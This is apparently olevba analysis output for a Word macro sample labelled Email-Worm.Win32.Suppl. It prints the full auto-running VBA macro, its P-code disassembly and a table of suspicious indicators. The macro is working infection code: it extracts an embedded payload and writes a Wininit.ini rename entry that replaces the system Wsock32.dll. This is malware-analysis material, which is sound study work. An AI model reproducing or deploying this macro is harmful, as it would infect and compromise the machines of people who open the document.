olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Email-Worm.Win32.Suppl
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Email-Worm.Win32.Suppl - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Sub GetWindowsDirectoryA Lib "KERNEL32" (ByVal s As String, ByVal l As Long)
Private Declare Sub GetSystemDirectoryA Lib "KERNEL32" (ByVal s As String, ByVal l As Long)
Private Declare Sub CopyFileA Lib "KERNEL32" (ByVal src As String, ByVal dst As String, ByVal mode As Long)
Private Declare Function GetFileAttributesA Lib "KERNEL32" (ByVal s As String) As Long
Private Declare Sub lstrcatA Lib "KERNEL32" (ByVal dst As String, ByVal src As String)
Private Declare Function lstrlenA Lib "KERNEL32" (ByVal s As String) As Long
Private Declare Function LZOpenFileA Lib "LZ32" (ByVal s As String, ByVal o As String, ByVal mode As Long) As Long
Private Declare Sub LZCopy Lib "LZ32" (ByVal src As Long, ByVal dst As Long)
Private Declare Sub LZClose Lib "LZ32" (ByVal h As Long)
Private Declare Function OpenFile Lib "KERNEL32" Alias "_lopen" (ByVal s As String, ByVal mode As Long) As Long
Private Declare Function CreateFile Lib "KERNEL32" Alias "_lcreat" (ByVal s As String, ByVal attr As Long) As Long
Private Declare Sub SeekFile Lib "KERNEL32" Alias "_llseek" (ByVal h As Long, ByVal ofs As Long, ByVal fw As Long)
Private Declare Sub ReadFile Lib "KERNEL32" Alias "_lread" (ByVal h As Long, ByVal ptr As Long, ByVal n As Long)
Private Declare Sub WriteFile Lib "KERNEL32" Alias "_lwrite" (ByVal h As Long, ByVal ptr As Long, ByVal n As Long)
Private Declare Sub WriteFile1 Lib "KERNEL32" Alias "_lwrite" (ByVal h As Long, ByVal ptr As String, ByVal n As Long)
Private Declare Sub CloseFile Lib "KERNEL32" Alias "_lclose" (ByVal h As Long)
Private Declare Function GlobalAlloc Lib "KERNEL32" (ByVal fl As Long, ByVal n As Long) As Long
Private Declare Sub GlobalFree Lib "KERNEL32" (ByVal ptr As Long)
Private Sub Document_Open()
If InStr(1, System.OperatingSystem, "Windows") <> 0 Then
Dim ws1 As String, ws2 As String
ws1 = String(256, "X")
GetSystemDirectoryA ws1, 256
ws2 = ws1
lstrcatA ws1, "\Wsock32.dll"
lstrcatA ws2, "\Wsock33.dll"
If GetFileAttributesA(ws2) = -1 Then
Dim ai As String, dt1 As String, dt2 As String, wi As String
Dim h As Long, g As Long, p As Long, ofs1 As String, ofs2 As String
Dim w As String
ai = ws1
GetWindowsDirectoryA ai, 256
dt1 = ai
dt2 = ai
wi = ai
ofs1 = ai
ofs2 = ai
lstrcatA ai, "\Anthrax.ini"
lstrcatA dt1, "\DLL.lzh"
lstrcatA dt2, "\DLL.tmp"
lstrcatA wi, "\Wininit.ini"
CopyFileA ActiveDocument.FullName, ai, 0
p = GlobalAlloc(0, 6712)
h = OpenFile(ai, 0)
SeekFile h, 32256, 0
ReadFile h, p, 6712
CloseFile h
h = CreateFile(dt1, 0)
WriteFile h, p, 6712
CloseFile h
GlobalFree (ptr)
h = LZOpenFileA(dt1, ofs1, 0)
g = LZOpenFileA(dt2, ofs2, 4096)
LZCopy h, g
LZClose g
LZClose h
w = "[rename]" & Chr(13) & Chr(10) & "nul=" & String(1010, 0)
lstrcatA w, dt1
lstrcatA w, Chr(13) & Chr(10) & Chr(0)
lstrcatA w, ws2
lstrcatA w, "="
lstrcatA w, ws1
lstrcatA w, Chr(13) & Chr(10) & Chr(0)
lstrcatA w, ws1
lstrcatA w, "="
lstrcatA w, dt2
h = CreateFile(wi, 0)
WriteFile1 h, w, lstrlenA(w)
CloseFile h
End If
End If
End Sub



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Email-Worm.Win32.Suppl
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 7718 bytes
' Line #0:
' 	FuncDefn (Private Declare Sub GetWindowsDirectoryA Lib "KERNEL32" (ByVal s As String, ByVal l As Long))
' Line #1:
' 	FuncDefn (Private Declare Sub GetSystemDirectoryA Lib "KERNEL32" (ByVal s As String, ByVal l As Long))
' Line #2:
' 	FuncDefn (Private Declare Sub CopyFileA Lib "KERNEL32" (ByVal src As String, ByVal dst As String, ByVal mode As Long))
' Line #3:
' 	FuncDefn (Private Declare Function GetFileAttributesA Lib "KERNEL32" (ByVal s As String) As Long)
' Line #4:
' 	FuncDefn (Private Declare Sub lstrcatA Lib "KERNEL32" (ByVal dst As String, ByVal src As String))
' Line #5:
' 	FuncDefn (Private Declare Function lstrlenA Lib "KERNEL32" (ByVal s As String) As Long)
' Line #6:
' 	FuncDefn (Private Declare Function LZOpenFileA Lib "LZ32" (ByVal s As String, ByVal o As String, ByVal mode As Long) As Long)
' Line #7:
' 	FuncDefn (Private Declare Sub LZCopy Lib "LZ32" (ByVal src As Long, ByVal dst As Long))
' Line #8:
' 	FuncDefn (Private Declare Sub LZClose Lib "LZ32" (ByVal h As Long))
' Line #9:
' 	FuncDefn (Private Declare Function OpenFile Lib "KERNEL32" (ByVal s As String, ByVal mode As Long) As Long)
' Line #10:
' 	FuncDefn (Private Declare Function CreateFile Lib "KERNEL32" (ByVal s As String, ByVal attr As Long) As Long)
' Line #11:
' 	FuncDefn (Private Declare Sub SeekFile Lib "KERNEL32" (ByVal h As Long, ByVal ofs As Long, ByVal fw As Long))
' Line #12:
' 	FuncDefn (Private Declare Sub ReadFile Lib "KERNEL32" (ByVal h As Long, ByVal ptr As Long, ByVal n As Long))
' Line #13:
' 	FuncDefn (Private Declare Sub WriteFile Lib "KERNEL32" (ByVal h As Long, ByVal ptr As Long, ByVal n As Long))
' Line #14:
' 	FuncDefn (Private Declare Sub WriteFile1 Lib "KERNEL32" (ByVal h As Long, ByVal ptr As String, ByVal n As Long))
' Line #15:
' 	FuncDefn (Private Declare Sub CloseFile Lib "KERNEL32" (ByVal h As Long))
' Line #16:
' 	FuncDefn (Private Declare Function GlobalAlloc Lib "KERNEL32" (ByVal fl As Long, ByVal n As Long) As Long)
' Line #17:
' 	FuncDefn (Private Declare Sub GlobalFree Lib "KERNEL32" (ByVal ptr As Long))
' Line #18:
' 	FuncDefn (Private Sub Document_Open())
' Line #19:
' 	LitDI2 0x0001 
' 	Ld System 
' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #20:
' 	Dim 
' 	VarDefn ws1 (As String)
' 	VarDefn ws2 (As String)
' Line #21:
' 	LitDI2 0x0100 
' 	LitStr 0x0001 "X"
' 	ArgsLd String$ 0x0002 
' 	St ws1 
' Line #22:
' 	Ld ws1 
' 	LitDI2 0x0100 
' 	ArgsCall GetSystemDirectoryA 0x0002 
' Line #23:
' 	Ld ws1 
' 	St ws2 
' Line #24:
' 	Ld ws1 
' 	LitStr 0x000C "\Wsock32.dll"
' 	ArgsCall lstrcatA 0x0002 
' Line #25:
' 	Ld ws2 
' 	LitStr 0x000C "\Wsock33.dll"
' 	ArgsCall lstrcatA 0x0002 
' Line #26:
' 	Ld ws2 
' 	ArgsLd GetFileAttributesA 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	IfBlock 
' Line #27:
' 	Dim 
' 	VarDefn ai (As String)
' 	VarDefn dt1 (As String)
' 	VarDefn dt2 (As String)
' 	VarDefn wi (As String)
' Line #28:
' 	Dim 
' 	VarDefn h (As Long)
' 	VarDefn g (As Long)
' 	VarDefn p (As Long)
' 	VarDefn ofs1 (As String)
' 	VarDefn ofs2 (As String)
' Line #29:
' 	Dim 
' 	VarDefn w (As String)
' Line #30:
' 	Ld ws1 
' 	St ai 
' Line #31:
' 	Ld ai 
' 	LitDI2 0x0100 
' 	ArgsCall GetWindowsDirectoryA 0x0002 
' Line #32:
' 	Ld ai 
' 	St dt1 
' Line #33:
' 	Ld ai 
' 	St dt2 
' Line #34:
' 	Ld ai 
' 	St wi 
' Line #35:
' 	Ld ai 
' 	St ofs1 
' Line #36:
' 	Ld ai 
' 	St ofs2 
' Line #37:
' 	Ld ai 
' 	LitStr 0x000C "\Anthrax.ini"
' 	ArgsCall lstrcatA 0x0002 
' Line #38:
' 	Ld dt1 
' 	LitStr 0x0008 "\DLL.lzh"
' 	ArgsCall lstrcatA 0x0002 
' Line #39:
' 	Ld dt2 
' 	LitStr 0x0008 "\DLL.tmp"
' 	ArgsCall lstrcatA 0x0002 
' Line #40:
' 	Ld wi 
' 	LitStr 0x000C "\Wininit.ini"
' 	ArgsCall lstrcatA 0x0002 
' Line #41:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ai 
' 	LitDI2 0x0000 
' 	ArgsCall CopyFileA 0x0003 
' Line #42:
' 	LitDI2 0x0000 
' 	LitDI2 0x1A38 
' 	ArgsLd GlobalAlloc 0x0002 
' 	St p 
' Line #43:
' 	Ld ai 
' 	LitDI2 0x0000 
' 	ArgsLd OpenFile 0x0002 
' 	St h 
' Line #44:
' 	Ld h 
' 	LitDI2 0x7E00 
' 	LitDI2 0x0000 
' 	ArgsCall SeekFile 0x0003 
' Line #45:
' 	Ld h 
' 	Ld p 
' 	LitDI2 0x1A38 
' 	ArgsCall ReadFile 0x0003 
' Line #46:
' 	Ld h 
' 	ArgsCall CloseFile 0x0001 
' Line #47:
' 	Ld dt1 
' 	LitDI2 0x0000 
' 	ArgsLd CreateFile 0x0002 
' 	St h 
' Line #48:
' 	Ld h 
' 	Ld p 
' 	LitDI2 0x1A38 
' 	ArgsCall WriteFile 0x0003 
' Line #49:
' 	Ld h 
' 	ArgsCall CloseFile 0x0001 
' Line #50:
' 	Ld ptr 
' 	Paren 
' 	ArgsCall GlobalFree 0x0001 
' Line #51:
' 	Ld dt1 
' 	Ld ofs1 
' 	LitDI2 0x0000 
' 	ArgsLd LZOpenFileA 0x0003 
' 	St h 
' Line #52:
' 	Ld dt2 
' 	Ld ofs2 
' 	LitDI2 0x1000 
' 	ArgsLd LZOpenFileA 0x0003 
' 	St g 
' Line #53:
' 	Ld h 
' 	Ld g 
' 	ArgsCall LZCopy 0x0002 
' Line #54:
' 	Ld g 
' 	ArgsCall LZClose 0x0001 
' Line #55:
' 	Ld h 
' 	ArgsCall LZClose 0x0001 
' Line #56:
' 	LitStr 0x0008 "[rename]"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0004 "nul="
' 	Concat 
' 	LitDI2 0x03F2 
' 	LitDI2 0x0000 
' 	ArgsLd String$ 0x0002 
' 	Concat 
' 	St w 
' Line #57:
' 	Ld w 
' 	Ld dt1 
' 	ArgsCall lstrcatA 0x0002 
' Line #58:
' 	Ld w 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	ArgsCall lstrcatA 0x0002 
' Line #59:
' 	Ld w 
' 	Ld ws2 
' 	ArgsCall lstrcatA 0x0002 
' Line #60:
' 	Ld w 
' 	LitStr 0x0001 "="
' 	ArgsCall lstrcatA 0x0002 
' Line #61:
' 	Ld w 
' 	Ld ws1 
' 	ArgsCall lstrcatA 0x0002 
' Line #62:
' 	Ld w 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	ArgsCall lstrcatA 0x0002 
' Line #63:
' 	Ld w 
' 	Ld ws1 
' 	ArgsCall lstrcatA 0x0002 
' Line #64:
' 	Ld w 
' 	LitStr 0x0001 "="
' 	ArgsCall lstrcatA 0x0002 
' Line #65:
' 	Ld w 
' 	Ld dt2 
' 	ArgsCall lstrcatA 0x0002 
' Line #66:
' 	Ld wi 
' 	LitDI2 0x0000 
' 	ArgsLd CreateFile 0x0002 
' 	St h 
' Line #67:
' 	Ld h 
' 	Ld w 
' 	Ld w 
' 	ArgsLd lstrlenA 0x0001 
' 	ArgsCall WriteFile1 0x0003 
' Line #68:
' 	Ld h 
' 	ArgsCall CloseFile 0x0001 
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	EndSub 
' Line #72:
' Line #73:
' Line #74:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Wsock32.dll         |Executable file name                         |
|IOC       |Wsock33.dll         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

